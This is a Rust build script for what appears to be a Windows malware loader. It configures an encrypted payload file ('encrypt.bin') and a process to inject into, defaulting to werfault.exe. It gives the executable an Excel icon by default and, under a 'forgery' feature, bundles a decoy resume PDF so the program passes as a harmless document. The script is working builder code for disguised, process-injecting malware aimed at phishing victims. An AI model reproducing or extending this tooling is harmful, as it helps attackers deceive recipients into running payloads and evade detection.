extern crate embed_resource;
include!("src/thunk.rs");

use std::{env, fs};

fn main() {
    // Environment variables to watch for changes
    let env_vars = [
        "CARGO_FEATURE_WIN7",
        "CARGO_FEATURE_PATTERN1",
        "CARGO_FEATURE_PATTERN2",
        "CARGO_FEATURE_PATTERN3",
        "CARGO_FEATURE_WITH_FORGERY",
        "RSL_TARGET_PROGRAM",
        "RSL_TARGET_PID",
        "RSL_ICON_PATH",
        "RSL_BUNDLE_FILE",
        "RSL_BUNDLE_FILENAME",
        "RSL_DEFAULT_PAYLOAD_ADDRESS",
        "RSL_GUI_DEFAULT_PAYLOAD_ADDRESS",
    ];

    for var in &env_vars {
        println!("cargo:rerun-if-env-changed={}", var);
    }

    // Set compile-time environment variable for bundle filename
    let bundle_filename = env::var("RSL_BUNDLE_FILENAME").unwrap_or_default();
    println!("cargo:rustc-env=RSL_BUNDLE_FILENAME={}", bundle_filename);

    // Set compile-time environment variable for default payload address
    let default_payload_address = env::var("RSL_DEFAULT_PAYLOAD_ADDRESS").unwrap_or_else(|_| "encrypt.bin".to_string());
    println!("cargo:rustc-env=RSL_DEFAULT_PAYLOAD_ADDRESS={}", default_payload_address);

    // Set compile-time environment variable for target program
    let target_program = env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"C:\Windows\System32\werfault.exe".to_string());
    println!("cargo:rustc-env=RSL_TARGET_PROGRAM={}", target_program);

    // Set compile-time environment variable for target PID
    let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
    println!("cargo:rustc-env=RSL_TARGET_PID={}", target_pid);

    // Conditional compilation tasks
    if env::var("CARGO_FEATURE_WIN7").is_ok() {
        println!("cargo:note=Win7 兼容已启用，执行 thunk");
        thunk();
    }

    generate_icon_rc();

    if env::var("CARGO_FEATURE_WITH_FORGERY").is_ok() {
        copy_bundle_file();
    }

    embed_resource::compile("icon.rc");
}


fn copy_bundle_file() {
    let bundle_file = env::var("RSL_BUNDLE_FILE")
        .unwrap_or_else(|_| {
            // Default to the resume file in bundle directory
            let default_path = std::path::Path::new("bundle").join("xxx简历.pdf");
            default_path.to_str().unwrap().to_string()
        });

    // Ensure absolute path
    let bundle_file = std::path::Path::new(&bundle_file);
    let bundle_file = if bundle_file.is_absolute() {
        bundle_file.to_path_buf()
    } else {
        std::env::current_dir().unwrap().join(bundle_file)
    };
    let bundle_file_str = bundle_file.to_str().unwrap();

    // Generate bundle_data.rs with direct include_bytes! call
    // Use raw string literal to avoid escaping issues
    let content = format!("pub const MEMORY_FILE: &[u8] = include_bytes!(r\"{}\");\n", bundle_file_str);
    fs::write("src/forgery/bundle_data.rs", content).expect("Failed to write bundle_data.rs");

    println!("cargo:note=Generated bundle_data.rs with file: {}", bundle_file_str);
}

fn generate_icon_rc() {
    let icon_path = env::var("RSL_ICON_PATH")
        .unwrap_or_else(|_| "icons/excel.ico".to_string())
        .replace("\\", "/");

    let content = format!(r#"iconName ICON "{}""#, icon_path);
    fs::write("icon.rc", content).expect("Failed to write icon.rc");
    println!("cargo:note=Generated icon.rc with icon: {}", icon_path);
}